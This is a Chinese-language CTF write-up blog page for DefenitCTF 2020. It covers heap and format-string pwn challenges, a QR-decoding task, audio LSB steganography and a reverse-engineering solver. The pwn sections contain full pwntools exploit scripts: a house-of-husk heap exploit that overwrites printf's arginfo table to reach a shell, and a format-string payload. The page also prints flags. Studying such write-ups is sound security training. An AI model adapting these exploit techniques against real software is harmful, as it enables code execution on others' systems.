@@ -1,0 +1,253 @@
+<!DOCTYPE html><html class="appearance-auto" lang="en"><head><meta charset="UTF-8"><title>DefenitCTF 2020 wp</title><meta name="description" content="May the Force be with you"><meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no, initial-scale=1"><!-- Google Analytics --><!-- End Google Analytics -->
+<!-- Baidu Analytics --><!-- End Baidu Analytics --><link rel="icon" href="/images/favicon.png"><link rel="stylesheet" href="/style/common/bulma.css"><link rel="stylesheet" href="/style/base.css"><link rel="stylesheet" href="/style/common/helper.css"><script src="/js/common.js"></script><link rel="stylesheet" href="/style/post.css"><link rel="stylesheet" href="/style/themes/highlight-theme-light.css"><script src="/js/highlight.pack.js"></script><meta name="description" content="PWNerrorProgram漏洞分析这道题目的堆操作给了MALLOC、FREE、EDIT、VIEW，MALLOC只能分配[0x777,0x77777]的块，也就是只能操纵large bin，FREE和EDIT都可以随意UAF，VIEW没有限制。
+
+题目给了假的栈溢出漏洞，程序会检查是否溢出并在溢出时exit退出。
+
+给了假的格式化字符串漏洞，因为输入的字符串中不能出现%和$。
+
+利用这道题目可以用今年四月份hatena提出的利用方式 house of husk，能够在有large bin UAF漏洞的情况下getshell。
+https://ptr-yudai.hatenablog.com/entry/2020/04/02/111507
+贴上学长大佬写的学习笔记：https://www.anquanke..."><!-- hexo injector head_end start -->
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
+<!-- hexo injector head_end end --><meta name="generator" content="Hexo 5.4.2"><link rel="alternate" href="/atom.xml" title="Q1IQ's blog" type="application/atom+xml">
+</head><body class="is-flex is-flex-direction-column"><header class="header-widget is-flex-shrink-0 is-hidden-mobile"><div class="container is-fullhd is-flex is-justify-content-space-between is-align-items-center is-full-height"><section class="is-hidden-mobile is-flex-shrink-0"><h2><a href="/">Q1IQ's blog</a></h2></section><h3 class="is-hidden-mobile is-family-serif is-full-height is-flex is-align-items-center is-flex-shrink-0"><div class="is-full-height" id="postTopic"><p class="is-full-height is-flex-shrink-0 is-flex is-align-items-center is-justify-content-center">DefenitCTF 2020 wp</p><p class="is-full-height is-flex-shrink-0 is-flex is-align-items-center is-justify-content-center">Click back to the top</p></div></h3><aside class="is-flex-shrink-0"><h3 class="is-inline-block"><a href="/">Home</a></h3><h3 class="is-inline-block"><a href="/about">About</a></h3><h3 class="is-inline-block"><a href="/archives">Archives</a></h3></aside></div></header><header class="is-flex header-widget is-flex-shrink-0 is-align-items-center is-justify-content-center is-hidden-tablet"><h3 class="is-inline-block"><a href="/">Home</a></h3><h3 class="is-inline-block"><a href="/about">About</a></h3><h3 class="is-inline-block"><a href="/archives">Archives</a></h3></header><main><main class="container is-max-widescreen content section post-page pt-4 px-4"><div class="columns is-flex-desktop is-justify-content-center is-flex-direction-row-reverse"><div class="column is-3 is-hidden-mobile"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#PWN"><span class="toc-text">PWN</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#errorProgram"><span class="toc-text">errorProgram</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8"><span class="toc-text">利用</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#warmup"><span class="toc-text">warmup</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-1"><span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-1"><span class="toc-text">利用</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Misc"><span class="toc-text">Misc</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#QR-Generator"><span class="toc-text">QR Generator</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Baby-Steganography"><span class="toc-text">Baby Steganography</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RE"><span class="toc-text">RE</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#momsTouch"><span class="toc-text">momsTouch</span></a></li></ol></li></ol></div><div class="column is-9"><header class="my-4"><a href="/tags/PWN"><i class="tag post-item-tag">PWN</i></a></header><h1 class="mt-0 mb-1 is-family-serif" id="postTitle">DefenitCTF 2020 wp</h1><time class="has-text-grey" datetime="2020-06-25T02:22:15.000Z">2020-06-25</time><article class="mt-2 post-content"><h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="errorProgram"><a href="#errorProgram" class="headerlink" title="errorProgram"></a>errorProgram</h3><h4 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><p>这道题目的堆操作给了MALLOC、FREE、EDIT、VIEW，MALLOC只能分配[0x777,0x77777]的块，也就是只能操纵large bin，FREE和EDIT都可以随意UAF，VIEW没有限制。</p>
+<p><img src="https://qiiq-1258887625.cos.ap-chengdu.myqcloud.com/image-20200614205046176.png" alt="image-20200614205046176"></p>
+<p>题目给了假的栈溢出漏洞，程序会检查是否溢出并在溢出时exit退出。</p>
+<p><img src="https://qiiq-1258887625.cos.ap-chengdu.myqcloud.com/image-20200614204603328.png" alt="image-20200614204603328"></p>
+<p>给了假的格式化字符串漏洞，因为输入的字符串中不能出现<code>%</code>和<code>$</code>。</p>
+<p><img src="https://qiiq-1258887625.cos.ap-chengdu.myqcloud.com/image-20200614204723582.png" alt="image-20200614204723582"></p>
+<h4 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h4><p>这道题目可以用今年四月份hatena提出的利用方式 house of husk，能够在有large bin UAF漏洞的情况下getshell。</p>
+<p><a target="_blank" rel="noopener" href="https://ptr-yudai.hatenablog.com/entry/2020/04/02/111507">https://ptr-yudai.hatenablog.com/entry/2020/04/02/111507</a></p>
+<p>贴上学长大佬写的学习笔记：<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/202387">https://www.anquanke.com/post/id/202387</a></p>
+<p>使用unsorted bin attack修改global_max_fast，将libc上的、位于main_arena之后的__printf_arginfo_table改为堆上的块地址，在块里提前写好onegadget。</p>
+<p><img src="https://qiiq-1258887625.cos.ap-chengdu.myqcloud.com/image-20200614203024124.png" alt="image-20200614203024124"></p>
+<p>可是这道题目给的格式化字符串漏洞不能输入<code>%</code>，就没法随意调用__printf_arginfo_table上的函数。不过栈溢出漏洞里有一个<code>%x</code>可供使用。</p>
+<p><img src="https://qiiq-1258887625.cos.ap-chengdu.myqcloud.com/image-20200614205559387.png" alt="image-20200614205559387"></p>
+<p>__printf_arginfo_table的内容如下，这样解析到<code>%x</code>时就可以调用到onegadget了。</p>
+<pre><code>c=b&#39;&#39;
+c=c.ljust((ord(&#39;x&#39;)-2)*8)
+c+=p64(libc.address+onegadgets[2])
+edit(1,c)
+或
+edit(2,c)</code></pre>
+<p>完整exp</p>
+<pre><code class="python">from pwn import*
+context.log_level = &#39;debug&#39;
+context.arch = &#39;amd64&#39;
+context.os = &#39;linux&#39;
+binary=&#39;./errorProgram.dms&#39;
+elf=ELF(binary)
+debug=1
+if debug:
+    io=process(binary)
+else:
+    io = remote(&quot;error-program.ctf.defenit.kr&quot;,7777)
+onegadgets=[0x4f2c5,0x4f322,0x10a38c]
+libc = ELF(&quot;./libc-2.27.so&quot;)
+s       = lambda data               :io.send(data) 
+sa      = lambda data1,data         :io.sendafter(data1, data)
+sl      = lambda data               :io.sendline(data)
+sla     = lambda data1,data         :io.sendlineafter(data1, data)
+r       = lambda numb=4096          :io.recv(numb)
+ru      = lambda data1, drop=True  :io.recvuntil(data1, drop)
+
+def malloc(idx,size):
+    ru(&#39;YOUR CHOICE? :&#39;)
+    sl(&#39;1&#39;)
+    ru(&#39;INDEX? :&#39;)
+    sl(str(idx))
+    ru(&#39;SIZE? :&#39;)
+    sl(str(size))#size &lt;= 0x776 || size &gt; 0x77777
+def free(idx):
+    ru(&#39;YOUR CHOICE? :&#39;)
+    sl(&#39;2&#39;)
+    ru(&#39;INDEX? :&#39;)
+    sl(str(idx))
+
+def edit(idx,data):
+    ru(&#39;YOUR CHOICE? :&#39;)
+    sl(&#39;3&#39;)
+    ru(&#39;INDEX? :&#39;)
+    sl(str(idx))
+    ru(&quot;DATA : &quot;)
+    sl(data)
+
+def view(idx):
+    ru(&#39;YOUR CHOICE? :&#39;)
+    sl(&#39;4&#39;)
+    ru(&#39;INDEX? :&#39;)
+    sl(str(idx))
+    ru(&quot;DATA : &quot;)
+
+def say(payload):
+    ru(&#39;YOUR CHOICE? :&#39;)
+    sl(&#39;1&#39;)
+    ru(&#39;Input your payload : &#39;)
+    sl(str(payload))
+
+#define MAIN_ARENA       0x3ebc40
+#define MAIN_ARENA_DELTA 0x60
+#define GLOBAL_MAX_FAST  0x3ed940
+#define PRINTF_FUNCTABLE 0x3f0658
+#define PRINTF_ARGINFO   0x3ec870
+#define ONE_GADGET       0x10a38c
+
+MAIN_ARENA      = 0x3ebc40
+MAIN_ARENA_DELTA= 0x60
+GLOBAL_MAX_FAST = 0x3ed940
+PRINTF_FUNCTABLE= 0x3f0658
+PRINTF_ARGINFO  = 0x3ec870 #__printf_arginfo_table
+offset2size=lambda ofs:((ofs) * 2 - 0x10) 
+
+ru(&#39;YOUR CHOICE? :&#39;)
+sl(&#39;3&#39;)
+malloc(0,0x800)
+malloc(1,offset2size(PRINTF_FUNCTABLE - MAIN_ARENA))
+malloc(2,offset2size(PRINTF_ARGINFO - MAIN_ARENA))
+#leak libc
+free(0)
+view(0)
+libc.address=u64(r(8))-0x3ebca0
+print(hex(libc.address))
+
+#unsorted bin attack step 1
+global_max_fast=0x3ed940
+c=b&#39;&#39;
+c+=p64(0)
+c+=p64(libc.address+global_max_fast-0x10)
+edit(0,c)
+
+#&#39;%x&#39; =&gt; onegadget
+c=b&#39;&#39;
+c=c.ljust((ord(&#39;x&#39;)-2)*8)
+c+=p64(libc.address+onegadgets[2])
+edit(2,c)
+
+#unsorted bin attack step 2
+malloc(3,0x800)
+
+
+free(1)#__printf_function_table =&gt; heap chunk 1
+free(2)#__printf_arginfo_table =&gt; heap chunk 2
+ru(&#39;YOUR CHOICE? :&#39;)
+sl(&#39;5&#39;)
+say(&#39;X&#39;*0x108)
+io.interactive()</code></pre>
+<h3 id="warmup"><a href="#warmup" class="headerlink" title="warmup"></a>warmup</h3><h4 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><p>存在格式化字符串漏洞，但是不是常规的printf函数，是snprintf函数，没有回显，无法泄露信息。另外程序使用exit退出，所以无法返回到栈上保存的vuln函数的返回地址。</p>
+<p><img src="https://qiiq-1258887625.cos.ap-chengdu.myqcloud.com/image-20200613220506361.png" alt="image-20200613220506361"></p>
+<p>题目给了后门函数win，位于0xA14。</p>
+<p><img src="https://qiiq-1258887625.cos.ap-chengdu.myqcloud.com/image-20200613220445154.png" alt="image-20200613220445154"></p>
+<h4 id="利用-1"><a href="#利用-1" class="headerlink" title="利用"></a>利用</h4><p>这里既然不能返回到vuln，可以尝试修改snprintf的返回地址。这里关闭aslr调试查看到，输入的数据是存放在0x7fffffffda20的，而0x7fffffffda60存放的是栈地址，可以拿来做一个跳板，修改位于0x7fffffffda18的snprintf的返回地址。还注意到snprintf的返回地址是0xa0a，而win函数的地址是0xa14，只需要修改末位即可。</p>
+<p>![](/Users/apple/Library/Application Support/typora-user-images/image-20200613221247196.png)</p>
+<p>exp</p>
+<pre><code class="python">from pwn import*
+context.log_level = &#39;debug&#39;
+context.arch = &#39;amd64&#39;
+context.os = &#39;linux&#39;
+binary=&#39;./warmup.dms&#39;
+elf=ELF(binary)
+debug=1
+if debug:
+    io=process(binary)
+else:
+    io = remote(&quot;warmup.ctf.defenit.kr&quot;,3333)
+libc = ELF(&quot;./libc.so.6&quot;)
+s       = lambda data               :io.send(data) 
+sa      = lambda data1,data         :io.sendafter(data1, data)
+sl      = lambda data               :io.sendline(data)
+sla     = lambda data1,data         :io.sendlineafter(data1, data)
+r       = lambda numb=4096          :io.recv(numb)
+ru      = lambda data1, drop=True  :io.recvuntil(data1, drop)
+
+s(&#39;%20c%12$hhn&#39;.ljust(0x40,&#39;\x11&#39;)+&#39;\x18&#39;)
+io.interactive()</code></pre>
+<p>拿到flag。</p>
+<p>![image-20200613222821210](/Users/apple/Library/Application Support/typora-user-images/image-20200613222821210.png)</p>
+<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="QR-Generator"><a href="#QR-Generator" class="headerlink" title="QR Generator"></a>QR Generator</h3><p>远程每次给一个0、1组成的二维码，1表示黑色，0表示白色，转换为二维码图片并识别二维码，循环100次即可。</p>
+<p><img src="https://qiiq-1258887625.cos.ap-chengdu.myqcloud.com/image-20200606154903393.png" alt="image-20200606154903393"></p>
+<pre><code class="python">#Defenit&#123;Welcome_to_the_2020_Defenit_CTF&#125;
+from pwn import *
+context.log_level=&#39;debug&#39;
+io=remote(&quot;qr-generator.ctf.defenit.kr&quot; ,9000)
+
+s       = lambda data               :io.send(data) 
+sa      = lambda data1,data         :io.sendafter(data1, data)
+sl      = lambda data               :io.sendline(data)
+sla     = lambda data1,data         :io.sendlineafter(data1, data)
+r       = lambda numb=4096          :io.recv(numb)
+ru      = lambda data1, drop=True  :io.recvuntil(data1, drop)
+
+import zxing
+reader = zxing.BarCodeReader()
+
+ru(&quot;What is your Hero&#39;s name? &quot;)
+sl(&#39;ook&#39;)
+
+while(1):
+    io.recvuntil(&quot;&lt; QR &gt;\n&quot;)
+    str1=ru(&quot;STAGE&quot;).decode(&quot;utf-8&quot;)
+    print(str1.find(&#39;\n&#39;) )
+    length=int((str1.find(&#39;\n&#39;))/2)
+    print(length)
+    str1=str1.replace(&quot; &quot;, &quot;&quot;)
+    str1=str1.replace(&quot;\n&quot;, &quot;&quot;)
+    import PIL
+    from PIL import Image
+    MAX = length
+    img = Image.new(&quot;RGB&quot;,(MAX,MAX))
+    i = 0
+    for y in range (0,MAX):
+        for x in range (0,MAX):
+            if(str1[i] == &#39;1&#39;):
+                img.putpixel([x,y],(0, 0, 0))
+            else:
+                img.putpixel([x,y],(255,255,255))
+            i = i+1
+    #img.show()
+    img.save(&quot;flag.png&quot;)
+    barcode = reader.decode(&quot;./flag.png&quot;)
+    print(barcode.parsed)
+    ru(&#39;&gt;&gt;&#39;)
+    sl(barcode.parsed)
+    #io.interactive()</code></pre>
+<h3 id="Baby-Steganography"><a href="#Baby-Steganography" class="headerlink" title="Baby Steganography"></a>Baby Steganography</h3><p>音频的sub bit隐写。</p>
+<pre><code class="python">fd=open(&#39;problem.wav&#39;,&#39;br&#39;)
+data=fd.read()
+s=&#39;&#39;
+for i in range(0,1515196):
+    c=0
+    for j in range(8):
+        c+=(data[i*8+j+4]&amp;1)&lt;&lt;(7-j)
+    s+=chr(c)
+f=open(&#39;ok4.txt&#39;,&#39;w+&#39;)
+f.write(s)
+#print(s)</code></pre>
+<h2 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h2><h3 id="momsTouch"><a href="#momsTouch" class="headerlink" title="momsTouch"></a>momsTouch</h3><p>主逻辑如下，输入0x49长的字符串，通过check即可。</p>
+<p><img src="https://qiiq-1258887625.cos.ap-chengdu.myqcloud.com/image-20200606154248868.png" alt="image-20200606154248868"></p>
+<p>check逻辑如下：</p>
+<p><img src="https://qiiq-1258887625.cos.ap-chengdu.myqcloud.com/image-20200606154322107.png" alt="image-20200606154322107"></p>
+<p>其中bss段上的dword_80492ac是在这里初始化的。这里虽然用到了rand，但是c语言中的rand是伪随机数，所以其实是确定的。</p>
+<p><img src="https://qiiq-1258887625.cos.ap-chengdu.myqcloud.com/image-20200606154231728.png" alt="image-20200606154231728"></p>
+<p>解题脚本如下：</p>
+<pre><code class="python">#Defenit&#123;ea40d42bfaf7d1f599abf284a35c535c607ccadbff38f7c39d6d57e238c4425e&#125;
+bss=[]
+fakerand=[0x2e9f873e,0x27cc5aea,0x533a1b0e,0x4ce1353b,0x1320125e,0x23e7bdbb,0x39b10f0,0x1953215c,0x2edc89cc,0x46dcafa8,0x2ffb7dac,0x1f48f0b0,0x2521e3af,0x140c6324,0x6824010b,0x54067762,0x210bb862,0x2adcc3b9,0x1c746e96,0x5b20b010,0x71d49e08,0x43c9a7a8,0x13a73a4f,0x7cf87e0,0x3f3cdf68,0x13347389,0x334e9d3c,0x254edba8,0x412a8b11,0x35e5f0c7,0x16d16bb,0x6fca124f,0x5db24bb1,0x54a731c9,0x3cab478a,0x70d25e0f,0x788eef84,0x4046587b,0xa257f6c,0x276b7951,0x7230823,0x3a20fd18,0x46b46a01,0x2c44ebd2,0x4e2d603c,0x2ed86b0d,0x4b6334,0x6f39189f,0x59b52ec6,0x1cbfd1cb,0x4a59c8af,0x4b89ccce,0x60897973,0x5e0102ff,0x535954af,0x1fc658db,0x71357688,0x6a7f1eb,0x45153484,0x32600199,0x3c8de2b2,0x46824b3f,0x222a13e8,0x1a402e63,0x1b297d09,0x5ed55b73,0xb128c73,0x13b86c8d,0x1f1bb3ee,0x15380bdf,0x3b23e5de,0x263ebc11,0x4f5908f7,0x1d84fe0,0x5283a7e3,0x1d866934,0x30b0baed,0x52cf0b17,0xcbf81d3,0xa65e9b3,0x6f8edce2,0x57194a82,0x55efb681,0x50185656,0x351a4d81,0x29490b30,0x6fdeaf31,0x264fc40a,0x2ff0fd1b,0x34f3e3b5,0x58afc5a3,0x6c7edfcd,0x7b762ef5,0x7ad9d98c,0x6bf0e31,0x169fabfe,0x59af34ff,0x11d19aa4,0x2a58188b,0x78cae8ed,0x2709a683,0x657bfe6a,0x1f09a4fe,0x7662af7a,0x67544e4a,0x718d4ce1,0x13e918ae,0x18050937,0x445c57f8,0x20a89a81,0x226af2ea,0x33eb34db,0x77c1e504,0x785aa96b,0x4038b31,0x2cdc3285,0x21a3b49c,0x73e23a62,0x532bf68f,0x5194b1b7,0x28d61e18,0x2bdbbc33,0x3e139185,0x244c4d0d,0x26b595bf,0x44d29fb6,0x3aebf90b,0x64cabe,0x56a43a5a,0x65441196,0x792fb3ab,0x7dade0dd,0x4ac01000,0x183958a9,0x74109057,0x32145e4a,0x9c6a58a,0x7f9a906,0x4a196781,0x4e22fd82,0x28a24387,0x6c845a6b,0x20e325d,0x2064288b,0x64df03d7,0x611bd8e,0x4d405b11,0x682b873,0x79f3f7f1,0x206c51a0,0x58176a2a,0x22ca1609,0x4c480dd3,0x162afbaf,0x47166316,0x72fda392,0x5afd9b65,0x2025c21,0x73626e50,0x31a1d5bf,0x67466db7,0x6c9221fb,0x2f4fb69c,0x32067db8,0x4cb7aa4,0x236046f4,0x641adc02,0xe92202e,0x2b59effa,0x2e344384,0x5cb51db1,0x53fc3381,0x1ab89def,0x5ec3500e,0x74605c0d,0x7f97a1c6,0x64d50d9d,0x41a0b71e,0x61a5a39,0x5ec9058e,0x620d08be,0x5e31c464,0x1931b97,0x2e551692,0x745cc013,0x48a97ead,0x2152ba24,0x4f5a5b79,0x4aabdace,0x14b52875,0xfc3138,0x31f24885,0x1474a70,0x304be7d5,0x63f8c63d,0x612c515,0x53ac2ec9,0x4813a240,0x14a4e543,0x7f061ec3,0x7647e5c4,0x715a02f4,0x53025244,0x110083b3,0x501d5303,0x4762ae51,0x1098257a,0x34f260a0,0x903656f,0x16b27fb3,0x13bb662e,0x6b106e2e,0x74e44417,0x154e81c5,0x196584c0,0x6941042b,0x5df80072,0x3ab83ee4,0x389b5fa4,0x28a3db40,0x4f6d6759,0x399790dc,0x5a9623c5,0x50b4b1ca,0x69e378b1,0x3e8eea03,0x56c776df,0x3d8fa77a,0x6a28c43,0x6b6c5c22,0x3c95c63d,0x7cea7207,0x5cc65f17,0xf981882,0xdeaf5ba,0x2ce3b21a,0x56fac6d3,0x1e831b34,0x61d612ba,0x5ffe2c43,0x35359ae8,0x759178e8,0x4b0e9a71,0x2a19deff,0xadffaad,0x64741f31,0x135ae32a,0x68d7fb1f,0x1f2c5e15,0x4bf642ce,0x117bd65f,0x6e99c56f,0x58dd3ab,0x6c11fa24,0x3f4e7739,0x6f714c5c,0x2aa0e427,0x1615ee18,0x2d00f3d7,0x3143706a,0x1824a3a,0x6996ba14,0x2e2de271,0x5e48a951,0x792ed296,0x3c18d82c,0xb2c5b6b,0x5029996a,0x5a9bf360,0x6d026e25,0x3027c5ad,0xfd18e48,0x6293e70d,0x7b36601e,0x39eb6d48,0x6d73e1ba,0x5faa7f4f,0x4d465072,0x564bdcd9,0x7ed6dd64,0x193c9341,0x67c7b338,0x6d70a2d3,0x1eca66ec,0x53d9ad5d,0x2cbf1a0c,0xe3bb348,0x7e7a9184,0x42d50824,0x3b3ca71f,0x2fbe01ef,0x4457525f,0x24d36134,0x5debe460,0x229ffbb0,0x1e0233ca,0x1a04bc8c,0x2dcc571c,0x6e2bcd34,0x74a0afed,0x1acec541,0x1e5392e1,0x4723e35,0x7d62ac4f,0x1989f2ff,0x3e5dab7d,0x6ad68e09,0x7934724e,0xba3fbf0,0x41226ae3,0x780b4fb3,0x24e08f31,0x28ea1e1b,0x657bf286,0x43aaf61d,0x7cc3cb78,0x123b0c93,0x51e6a965,0x7b3e5cfd,0x551014b7,0xd235085,0x2afc5eec,0x19676716,0x31f6b1b9,0x8e8434c,0x3c0762c7,0x4ff8e583,0x22ecffd9,0x69d3b9e3,0x3e24b2b8,0x178dafc6,0x4a27f24,0x5c784599,0x1bffedfb,0x2052b73,0x76023899,0x5a5d9979]
+print(hex(fakerand[257]))#.index(0x1615ee18))
+for i in range(1,257):
+    v1=fakerand[i]
+    result = 255 * (v1 // 255)
+    bss.append(v1-result)
+
+bss2=[ 186,28,4,248,59,168,156,124,142,152,129,137,9,85,208,238,197,253,71,80,162,70,223,99,46,81,56,254,106,242,160,90,148,229,73,98,55,31,121,216,84,28,229,104,187,240,96,100,15,73,205,125,169,253,2,125,202,3,50,128,197,75,61,233,116,141,61,138,44,178,48,120,196,0]
+
+flag=&#39;&#39;
+for v1 in range(0x49):
+    v2 =( ((16 * (bss[v1]&amp;0xff))&amp;0xff) | (bss[v1] &gt;&gt; 4))
+    v3 = fakerand[257+v1]
+    a=(bss[(((4 * (v3 + v3 // 255))&amp;0xff )| ((v3 % 255) &gt;&gt; 2))] ^ bss[v2] ^ bss2[v1] )
+    flag+=chr(a)
+print(flag)
+</code></pre>
+</article><section class="jump-container is-flex is-justify-content-space-between my-6"><!-- em is empty placeholder--><a class="button is-default" href="/D-Link-CVE-2019-7298/" title="D-Link CVE-2019-7298学习记录"><i class="iconfont icon-prev mr-2 has-text-grey"></i><span class="has-text-weight-semibold">Previous: D-Link CVE-2019-7298学习记录</span></a><a class="button is-default" href="/RCTF-wp/" title="RCTF 2020 wp"><span class="has-text-weight-semibold">Next: RCTF 2020 wp</span><i class="iconfont icon-next ml-2 has-text-grey"></i></a></section><article class="mt-6 comment-container"><script async repo="Q1IQ/Claudia-theme-blog" src="https://utteranc.es/client.js" issue-term="pathname" theme="preferred-color-scheme"></script></article></div></div></main></main><footer class="is-flex is-flex-direction-column is-align-items-center is-flex-shrink-0 is-family-serif"><section class="sns-container"><a title="twitter" target="_blank" rel="noopener nofollow" href="//twitter.com//"><i class="iconfont icon-twitter"></i></a><!-- Github--><a title="github" target="_blank" rel="noopener nofollow" href="//github.com/Q1IQ"><i class="iconfont icon-github"></i></a><!-- Ins--><a title="instagram" target="_blank" rel="noopener nofollow" href="//www.instagram.com//"><i class="iconfont icon-ins"></i></a><!-- RSS--><a title="rss" target="_blank" rel="noopener nofollow" href="/atom.xml"><i class="iconfont icon-rss"></i></a><!-- 知乎--><!-- 领英--><!-- 脸书--><a title="facebook" target="_blank" rel="noopener nofollow" href="//www.facebook.com//"><i class="iconfont icon-tian7_facebook"></i></a></section><p><span>Copyright ©</span><span> Q1IQ 2022</span></p><div class="is-flex is-justify-content-center is-flex-wrap-wrap"><p>Powered by Hexo &verbar;&nbsp;</p><p class="is-flex is-justify-content-center"><a title="Hexo theme author" target="_blank" rel="noopener" href="//github.com/haojen">Theme by Haojen&nbsp;</a></p><div style="margin-top: 2px"><a class="github-button" title="github-button" target="_blank" rel="noopener" href="https://github.com/haojen/hexo-theme-Claudia" data-color-scheme="no-preference: light; light: light; dark: dark;" data-show-count="true"></a></div></div><div><span></span></div></footer><script async defer src="https://buttons.github.io/buttons.js"></script><script src="/js/post.js"></script></body></html>
